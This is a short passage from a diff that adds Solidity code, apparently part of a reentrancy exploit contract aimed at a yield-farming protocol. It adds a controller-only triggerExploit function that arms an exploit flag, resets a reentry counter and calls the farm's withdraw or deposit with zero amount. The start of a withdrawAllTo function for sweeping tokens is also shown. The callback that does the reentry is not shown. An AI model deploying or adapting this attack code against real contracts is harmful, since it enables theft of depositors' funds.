+        FARM.deposit(pid_, amount);
+    }
+
+    function triggerExploit() external onlyController {
+        exploitArmed = true;
+        reentryCount = 0;
+        lastMintedValue = 0;
+
+        if (useWithdrawPath) {
+            FARM.withdraw(activePid, 0);
+        } else {
+            FARM.deposit(activePid, 0);
+        }
+
+        exploitArmed = false;
+    }
+
+    function withdrawAllTo(address token, address to) external onlyController {
